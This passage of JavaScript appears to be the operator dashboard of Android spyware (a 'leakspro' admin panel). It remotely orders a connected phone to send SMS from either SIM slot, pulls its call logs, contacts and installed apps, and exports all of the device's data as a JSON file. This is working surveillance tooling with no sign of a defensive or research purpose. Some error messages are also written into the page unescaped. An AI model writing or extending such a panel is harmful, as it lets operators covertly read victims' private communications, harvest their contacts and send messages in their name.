  // Disable buttons while sending
  const btn1 = document.getElementById('smsSim1Btn');
  const btn2 = document.getElementById('smsSim2Btn');
  btn1.disabled = true;
  btn2.disabled = true;

  const statusEl = document.getElementById('smsSendStatus');
  statusEl.className = 'sms-send-status sending';
  statusEl.innerHTML = `<i class="ri-loader-4-line ri-spin"></i> Sending via SIM ${simSlot}...`;
  statusEl.classList.remove('hidden');

  try {
    const res = await fetch(`${API_BASE}/api/admin/send-sms`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        password: adminPassword,
        device_id: modalDeviceId,
        receiver,
        message,
        sim_slot: simSlot,
      }),
    });

    const data = await res.json();
    if (res.ok && data.success) {
      statusEl.className = 'sms-send-status success';
      statusEl.innerHTML = `<i class="ri-checkbox-circle-line"></i> Command sent! Waiting for device to send SMS...`;
      showToast('Send command dispatched to device', 'success');
    } else {
      statusEl.className = 'sms-send-status error';
      statusEl.innerHTML = `<i class="ri-error-warning-line"></i> ${data.error || 'Failed to send command'}`;
      showToast(data.error || 'Failed to send SMS', 'error');
    }
  } catch (err) {
    statusEl.className = 'sms-send-status error';
    statusEl.innerHTML = `<i class="ri-error-warning-line"></i> Network error: ${err.message}`;
    showToast('Network error: ' + err.message, 'error');
  } finally {
    btn1.disabled = false;
    btn2.disabled = false;

    // Auto-hide status after 5 seconds
    setTimeout(() => {
      statusEl.classList.add('hidden');
    }, 5000);
  }
}
window.sendSmsFromDevice = sendSmsFromDevice;

// ========== Call Logs Tab ==========
async function loadCallLogs(page) {
  try {
    callsCurrentPage = page;
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/call-logs?page=${page}&limit=50`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allCallLogs = data.logs || [];
    const total = data.total || 0;
    const totalPages = data.totalPages || 1;

    renderCallLogs(allCallLogs);
    renderCallsPagination(page, totalPages, total);
  } catch (err) {
    document.getElementById('callsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD CALL LOGS</p></div>`;
    showToast('Failed to load call logs: ' + err.message, 'error');
  }
}
window.loadCallLogs = loadCallLogs;

function renderCallLogs(logs) {
  const container = document.getElementById('callsListContainer');
  if (!logs || logs.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-phone-line"></i><p>NO CALL LOGS FOUND</p></div>`;
    return;
  }

  container.innerHTML = logs.map(l => {
    const typeMap = { 1: 'INCOMING', 2: 'OUTGOING', 3: 'MISSED', 4: 'VOICEMAIL', 5: 'REJECTED' };
    const typeClass = { 1: 'call-in', 2: 'call-out', 3: 'call-miss', 4: 'call-vm', 5: 'call-miss' };
    const iconMap = { 1: 'ri-phone-line', 2: 'ri-phone-line', 3: 'ri-phone-line', 4: 'ri-voiceprint-line', 5: 'ri-phone-line' };
    const type = l.type || 1;
    const label = typeMap[type] || 'UNKNOWN';
    const cls = typeClass[type] || 'call-in';
    const icon = iconMap[type] || 'ri-phone-line';
    const dateStr = l.date ? new Date(l.date).toLocaleString() : '?';
    const durMin = Math.floor((l.duration || 0) / 60);
    const durSec = (l.duration || 0) % 60;
    const durStr = l.duration > 0 ? `${durMin}m ${durSec}s` : '0s';
    const name = l.name || '';
    const avatar = (l.number || '?').charAt(0).toUpperCase();

    return `
    <div class="tab-item ${cls}">
      <div class="tab-avatar">${avatar}</div>
      <div class="tab-item-content">
        <div class="tab-item-top">
          <span class="tab-item-title">${esc(l.number || 'Unknown')}${name ? ` <small>(${esc(name)})</small>` : ''}</span>
          <span class="tab-item-badge ${cls}">${label}</span>
        </div>
        <div class="tab-item-meta">
          <span><i class="ri-time-line"></i> ${durStr}</span>
          <span>${dateStr}</span>
        </div>
      </div>
    </div>`;
  }).join('');
}

function renderCallsPagination(currentPage, totalPages, total) {
  const container = document.getElementById('callsPagination');
  if (totalPages <= 1) { container.innerHTML = ''; return; }
  let html = '';
  if (currentPage > 1) html += `<button onclick="loadCallLogs(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
  const s = Math.max(1, currentPage - 2), e = Math.min(totalPages, currentPage + 2);
  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadCallLogs(${i})">${i}</button>`;
  if (currentPage < totalPages) html += `<button onclick="loadCallLogs(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
  html += `<span class="tab-page-info">${total} calls</span>`;
  container.innerHTML = html;
}

function filterCallLogs() {
  const q = document.getElementById('callSearch').value.toLowerCase().trim();
  if (!q) { renderCallLogs(allCallLogs); return; }
  const f = allCallLogs.filter(l => (l.number||'').toLowerCase().includes(q) || (l.name||'').toLowerCase().includes(q));
  renderCallLogs(f);
}
window.filterCallLogs = filterCallLogs;

// ========== Contacts Tab ==========
async function loadContacts(page) {
  try {
    contactsCurrentPage = page;
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/contacts?page=${page}&limit=100`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allContacts = data.contacts || [];
    const total = data.total || 0;
    const totalPages = data.totalPages || 1;

    renderContacts(allContacts);
    renderContactsPagination(page, totalPages, total);
  } catch (err) {
    document.getElementById('contactsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD CONTACTS</p></div>`;
    showToast('Failed to load contacts: ' + err.message, 'error');
  }
}
window.loadContacts = loadContacts;

function renderContacts(contacts) {
  const container = document.getElementById('contactsListContainer');
  if (!contacts || contacts.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-contacts-book-line"></i><p>NO CONTACTS FOUND</p></div>`;
    return;
  }

  container.innerHTML = contacts.map(c => {
    const avatar = (c.name || '?').charAt(0).toUpperCase();
    const phones = Array.isArray(c.phones) ? c.phones : [];
    const emails = Array.isArray(c.emails) ? c.emails : [];
    const phoneStr = phones.length > 0 ? phones.map(p => `<span class="contact-phone"><i class="ri-phone-line"></i>${esc(p)}</span>`).join('') : '<span class="contact-none">No phone</span>';
    const emailStr = emails.length > 0 ? emails.map(e => `<span class="contact-email"><i class="ri-mail-line"></i>${esc(e)}</span>`).join('') : '';

    return `
    <div class="tab-item contact-item">
      <div class="tab-avatar contact-avatar">${avatar}</div>
      <div class="tab-item-content">
        <div class="tab-item-top">
          <span class="tab-item-title">${esc(c.name || 'Unknown')}</span>
        </div>
        <div class="contact-details">
          ${phoneStr}
          ${emailStr}
        </div>
      </div>
    </div>`;
  }).join('');
}

function renderContactsPagination(currentPage, totalPages, total) {
  const container = document.getElementById('contactsPagination');
  if (totalPages <= 1) { container.innerHTML = ''; return; }
  let html = '';
  if (currentPage > 1) html += `<button onclick="loadContacts(${currentPage - 1})"><i class="ri-arrow-left-s-line"></i></button>`;
  const s = Math.max(1, currentPage - 2), e = Math.min(totalPages, currentPage + 2);
  for (let i = s; i <= e; i++) html += `<button class="${i===currentPage?'active':''}" onclick="loadContacts(${i})">${i}</button>`;
  if (currentPage < totalPages) html += `<button onclick="loadContacts(${currentPage + 1})"><i class="ri-arrow-right-s-line"></i></button>`;
  html += `<span class="tab-page-info">${total} contacts</span>`;
  container.innerHTML = html;
}

function filterContacts() {
  const q = document.getElementById('contactSearch').value.toLowerCase().trim();
  if (!q) { renderContacts(allContacts); return; }
  const f = allContacts.filter(c => {
    if ((c.name||'').toLowerCase().includes(q)) return true;
    const phones = Array.isArray(c.phones) ? c.phones : [];
    if (phones.some(p => p.toLowerCase().includes(q))) return true;
    const emails = Array.isArray(c.emails) ? c.emails : [];
    if (emails.some(e => e.toLowerCase().includes(q))) return true;
    return false;
  });
  renderContacts(f);
}
window.filterContacts = filterContacts;

// ========== Installed Apps Tab ==========
async function loadApps() {
  try {
    const showSystem = document.getElementById('showSystemApps')?.checked ? 'true' : 'false';
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/apps?system=${showSystem}`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    allApps = data.apps || [];

    renderApps(allApps);
  } catch (err) {
    document.getElementById('appsListContainer').innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD APPS</p></div>`;
    showToast('Failed to load apps: ' + err.message, 'error');
  }
}
window.loadApps = loadApps;

function renderApps(apps) {
  const container = document.getElementById('appsListContainer');
  if (!apps || apps.length === 0) {
    container.innerHTML = `<div class="tab-empty"><i class="ri-apps-line"></i><p>NO APPS FOUND</p></div>`;
    return;
  }

  container.innerHTML = `<div class="apps-count">${apps.length} apps</div>` + apps.map(a => {
    const installDate = a.install_time ? new Date(a.install_time).toLocaleDateString() : '?';
    const isSystem = a.is_system ? '<span class="app-system-badge">SYSTEM</span>' : '';

    return `
    <div class="tab-item app-item">
      <div class="tab-avatar app-avatar"><i class="ri-app-store-line"></i></div>
      <div class="tab-item-content">
        <div class="tab-item-top">
          <span class="tab-item-title">${esc(a.app_name || a.package_name)}</span>
          ${isSystem}
        </div>
        <div class="tab-item-meta">
          <span class="app-pkg">${esc(a.package_name)}</span>
          <span>v${esc(a.version || '?')} · Installed: ${installDate}</span>
        </div>
      </div>
    </div>`;
  }).join('');
}

function filterApps() {
  const q = document.getElementById('appSearch').value.toLowerCase().trim();
  if (!q) { renderApps(allApps); return; }
  const f = allApps.filter(a =>
    (a.app_name||'').toLowerCase().includes(q) ||
    (a.package_name||'').toLowerCase().includes(q)
  );
  renderApps(f);
}
window.filterApps = filterApps;

// ========== Export Device Data ==========
async function exportDeviceData() {
  if (!modalDeviceId) return showToast('No device selected', 'error');
  try {
    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/export`, {
      headers: { 'x-admin-password': adminPassword },
    });
    const data = await res.json();
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `device_${modalDeviceId.substring(0, 8)}_export.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast('Export downloaded successfully!', 'success');
  } catch (err) {
    showToast('Export failed: ' + err.message, 'error');
  }
}
window.exportDeviceData = exportDeviceData;

// ========== Settings ==========
async function saveSettings() {
  const settings = {};
  const appName = document.getElementById('settingAppName').value;
  const password = document.getElementById('settingPassword').value;
  const maxSize = document.getElementById('settingMaxSize').value;

  if (appName) settings.app_name = appName;
  if (password) settings.admin_password = password;
  if (maxSize) settings.max_upload_size = maxSize;

  try {
    const res = await fetch(`${API_BASE}/api/admin/settings`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'x-admin-password': adminPassword,
      },
      body: JSON.stringify({ settings }),
    });
    if (res.ok) {
      if (password) {
        adminPassword = password;
        localStorage.setItem('leakspro_admin_pw', password);
      }
      showToast('Settings saved!', 'success');
    } else throw new Error('Failed to save');
  } catch (err) {
    showToast('Error: ' + err.message, 'error');
  }
}

// ========== Activity Log ==========
function addActivity(icon, msg) {
  const log = document.getElementById('activityLog');
  const empty = log.querySelector('.empty');
  if (empty) empty.remove();

  const el = document.createElement('div');
  el.className = 'act-item';
  el.innerHTML = `<i class="${icon}"></i><span>${esc(msg)}</span><span class="time">${new Date().toLocaleTimeString()}</span>`;
  log.prepend(el);

  while (log.children.length > 50) log.removeChild(log.lastChild);
}

// ========== Helpers ==========
function getThumbUrl(thumb) {
  if (!thumb) return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIwIiBoZWlnaHQ9IjE4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMzIwIiBoZWlnaHQ9IjE4MCIgZmlsbD0iIzIyMiIvPjx0ZXh0IHg9IjE2MCIgeT0iOTAiIGZpbGw9IiM2NjYiIGZvbnQtc2l6ZT0iMTQiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGFsaWdubWVudC1iYXNlbGluZT0ibWlkZGxlIj5ObyBUaHVtYm5haWw8L3RleHQ+PC9zdmc+';
  if (thumb.startsWith('http')) return thumb;
  return `${API_BASE}/uploads/thumbnails/${thumb}`;
}

function fmtNum(n) {
  if (!n) return '0';
  if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
  if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
  return String(n);
}

function fmtBytes(b) {
  if (!b || b === 0) return '0 B';
  const s = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(b) / Math.log(1024));
  return (b / Math.pow(1024, i)).toFixed(1) + ' ' + s[i];
}

function fmtDur(sec) {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  if (h > 0) return `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  return `${m}:${String(s).padStart(2, '0')}`;
}

function fmtDate(d) {
  const dt = new Date(d);
  const now = new Date();
  const diff = Math.floor((now - dt) / 1000);
  if (diff < 60) return 'Just now';
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
  return dt.toLocaleDateString();
}

function timeAgo(d) {
  if (!d) return 'N/A';
  const dt = new Date(d + (d.endsWith('Z') ? '' : 'Z')); // ensure UTC
  const now = new Date();
  const diff = Math.floor((now - dt) / 1000);
  if (diff < 0) return 'Just now';
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
  return dt.toLocaleDateString();
}

function esc(s) {
  if (!s) return '';
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

function showToast(msg, type = 'info') {
  const c = document.getElementById('toastContainer');
  const t = document.createElement('div');
  t.className = `toast ${type}`;
  const icons = { success: 'ri-checkbox-circle-line', error: 'ri-error-warning-line', info: 'ri-information-line' };
  t.innerHTML = `<i class="${icons[type] || icons.info}"></i><span>${msg}</span>`;
  c.appendChild(t);
  setTimeout(() => {
    t.style.opacity = '0';
    t.style.transform = 'translateX(80px)';
    setTimeout(() => t.remove(), 300);
  }, 4000);
}
